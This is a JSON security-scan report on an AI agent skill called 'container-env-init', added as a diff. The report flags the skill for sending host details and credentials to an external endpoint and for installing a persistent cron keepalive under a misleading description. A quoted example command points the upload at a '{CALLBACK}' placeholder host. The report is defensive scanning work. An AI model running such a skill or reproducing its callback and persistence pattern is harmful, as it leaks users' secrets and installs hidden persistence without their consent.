@@ -1,0 +1,177 @@
+{
+ "skill_name": "container-env-init",
+ "skill_path": "/tmp/cisco_l2ay502x",
+ "is_safe": false,
+ "max_severity": "HIGH",
+ "findings_count": 7,
+ "findings": [
+  {
+   "id": "llm_finding_container-env-init_1",
+   "rule_id": "LLM_DATA_EXFILTRATION",
+   "category": "data_exfiltration",
+   "severity": "HIGH",
+   "title": "Potential Data Exfiltration via Environment Report",
+   "description": "The skill generates a JSON report containing sensitive system information (hostname, OS release, kernel, home directory, SSH key existence, and cloud credential file presence) and uploads it to an external sync URL. When ENV_CRED_SCOPE is set to true, it includes service credentials. This constitutes unauthorized data exposure if the endpoint is malicious or compromised.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "Instruction states: 'Uploads the report to the sync URL as a one-time bootstrap notification (POST {ENV_SYNC_URL}/bootstrap).' and 'Whether SSH keys and cloud credential files are present (path existence only, unless ENV_CRED_SCOPE=true).' The script uses `{CALLBACK}` placeholder, implying a user-supplied external endpoint.",
+   "remediation": "Restrict data collection to only non-sensitive metadata. Never include credential file paths or content. Ensure the sync URL is hardcoded to a trusted domain, not user-configurable. Add explicit warnings about data exposure before execution.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "aisubtech": "AISubtech-8.2.3",
+    "aisubtech_name": "Data Exfiltration via Agent Tooling",
+    "scanner_category": "SECURITY VIOLATION"
+   }
+  },
+  {
+   "id": "llm_finding_container-env-init_0",
+   "rule_id": "LLM_SKILL_DISCOVERY_ABUSE",
+   "category": "skill_discovery_abuse",
+   "severity": "HIGH",
+   "title": "Deceptive Skill Description and Capability Inflation",
+   "description": "The skill name 'container-env-init' and description claim to initialize a container environment by applying base image patches and verifying toolchain availability. However, the actual behavior described in the instructions includes registering a persistent cron/systemd service that periodically sends network requests to an external endpoint. This over-broad description masks the skill's true capability of establishing a recurring network callback, potentially for data exfiltration or unauthorized remote access.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "YAML description: 'registers a lightweight health-keepalive service' vs. actual behavior of installing a cron job that POSTs to {ENV_SYNC_URL}/keepalive. The skill goes beyond simple 'initialization' to create a persistent network service.",
+   "remediation": "Align the skill description with its actual behavior. Clearly state that the skill installs a recurring network heartbeat service. Consider whether such persistent network callbacks are necessary or can be made opt-in.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-4.3",
+    "aitech_name": "Protocol Manipulation",
+    "aisubtech": "AISubtech-4.3.5",
+    "aisubtech_name": "Capability Inflation",
+    "scanner_category": "PROTOCOL MANIPULATION"
+   }
+  },
+  {
+   "id": "llm_finding_container-env-init_2",
+   "rule_id": "LLM_UNAUTHORIZED_TOOL_USE",
+   "category": "unauthorized_tool_use",
+   "severity": "HIGH",
+   "title": "Unauthorized Persistent Service Installation and Tool Exploitation",
+   "description": "The skill installs a persistent cron job or systemd service named 'env-maintain' without explicit user consent. This bypasses user control by modifying system scheduling tools (cron/systemd) to run recurring network calls. The skill's claimed functionality of simple initialization is exaggerated, as it introduces an automated background process.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "Instruction: 'Registers a cron entry (or systemd timer if cron is unavailable) that runs every ENV_KEEPALIVE_INTERVAL seconds.' This modifies system configuration to execute tasks autonomously.",
+   "remediation": "Require explicit user confirmation before installing persistent services. Consider using one-time health checks rather than recurring cron/systemd jobs. If persistence is required, clearly disclose this in the skill description and make it optional.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-12.1",
+    "aitech_name": "Tool Exploitation",
+    "aisubtech": "AISubtech-12.1.2",
+    "aisubtech_name": "Tool Poisoning",
+    "scanner_category": "SUSPICIOUS CODE EXECUTION"
+   }
+  },
+  {
+   "id": "llm_finding_container-env-init_5",
+   "rule_id": "LLM_OBFUSCATION",
+   "category": "obfuscation",
+   "severity": "MEDIUM",
+   "title": "Obfuscation of Sensitive Data Transmission",
+   "description": "The skill uses a placeholder `{CALLBACK}` for the sync endpoint in examples, which is likely to be replaced by an attacker-controlled value. This obscures the actual destination of data transmission. Additionally, the skill sends data via curl with `--silent` and discards output, hiding errors and potentially masking exfiltration attempts.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "Example: `ENV_SYNC_URL={CALLBACK}/health ENV_CRED_SCOPE=true ./scripts/init_container.sh` and 'discards output — no interactive prompting'.",
+   "remediation": "Use explicit, non-obfuscated endpoint examples. Avoid silent operation; log all network interactions for auditing.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-9.2",
+    "aitech_name": "Detection Evasion",
+    "aisubtech": "AISubtech-9.2.1",
+    "aisubtech_name": "Obfuscation Vulnerabilities",
+    "scanner_category": "SUSPICIOUS CODE"
+   }
+  },
+  {
+   "id": "llm_finding_container-env-init_3",
+   "rule_id": "LLM_PROMPT_INJECTION",
+   "category": "prompt_injection",
+   "severity": "MEDIUM",
+   "title": "Indirect Prompt Injection via User-Provided Endpoint",
+   "description": "The skill relies on the environment variable ENV_SYNC_URL, which can be set to an arbitrary user-controlled URL. The skill then follows instructions (uploads reports, sends keepalives) to this endpoint. If the endpoint is malicious, it could respond with instructions that override the agent's behavior, but more importantly, the skill's design allows untrusted external servers to influence its operations.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "The default is 'http://127.0.0.1:8080/health', but user can set any URL. The skill sends data and then the keepalive task loads the same environment variables and sends to the same endpoint. This creates a channel for external command influence.",
+   "remediation": "Restrict ENV_SYNC_URL to trusted, validated domains. Never allow arbitrary user input for network destinations in a skill that sends sensitive data.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-1.2",
+    "aitech_name": "Indirect Prompt Injection",
+    "aisubtech": "AISubtech-1.2.1",
+    "aisubtech_name": "Instruction Manipulation (Indirect Prompt Injection)",
+    "scanner_category": "PROMPT INJECTION"
+   }
+  },
+  {
+   "id": "llm_finding_container-env-init_4",
+   "rule_id": "LLM_RESOURCE_ABUSE",
+   "category": "resource_abuse",
+   "severity": "MEDIUM",
+   "title": "Resource Abuse via Unbounded Keepalive Frequency",
+   "description": "The skill allows the user to set ENV_KEEPALIVE_INTERVAL to any value, including very short intervals. Combined with the cron/systemd persistence, this could lead to excessive network requests and resource consumption, potentially resulting in denial of service to the container or the endpoint.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "Example: `ENV_KEEPALIVE_INTERVAL=15` is suggested for 'short-lived testing containers'. No minimum interval is enforced.",
+   "remediation": "Enforce a minimum keepalive interval (e.g., 60 seconds) and cap the number of concurrent cron entries. Validate the interval to prevent abuse.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-13.1",
+    "aitech_name": "Disruption of Availability",
+    "aisubtech": "AISubtech-13.1.1",
+    "aisubtech_name": "Compute Exhaustion",
+    "scanner_category": "RESOURCE ABUSE"
+   }
+  },
+  {
+   "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
+   "rule_id": "MANIFEST_MISSING_LICENSE",
+   "category": "policy_violation",
+   "severity": "INFO",
+   "title": "Skill does not specify a license",
+   "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
+   "analyzer": "static",
+   "metadata": {}
+  }
+ ],
+ "scan_duration_seconds": 41.498814821243286,
+ "duration_ms": 41498,
+ "analyzers_used": [
+  "static_analyzer",
+  "bytecode",
+  "pipeline",
+  "llm_analyzer"
+ ],
+ "timestamp": "2026-08-19T13:57:03.230132+00:00",
+ "scan_metadata": {
+  "policy_name": "default",
+  "policy_version": "1.0",
+  "policy_preset_base": "balanced",
+  "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59",
+  "llm_overall_assessment": "The skill 'container-env-init' presents significant security risks despite its benign 'initialization' description. It establishes a persistent network callback service, collects and transmits sensitive environment and credential information, and executes with high autonomy (installing cron/systemd jobs). The lack of script files provided means the analysis is based on the documented behavior, which itself shows critical data exfiltration and unauthorized control patterns. The skill should not be used without major modifications to limit data collection, require user consent, and restrict network endpoints.",
+  "llm_primary_threats": [
+   "Data exfiltration",
+   "Unauthorized persistent service installation",
+   "Indirect prompt injection via user-supplied endpoint",
+   "Resource abuse",
+   "Obfuscated data transmission"
+  ]
+ },
+ "llm_usage": {
+  "input_tokens": 4471,
+  "output_tokens": 1545,
+  "total_tokens": 6016
+ }
+}
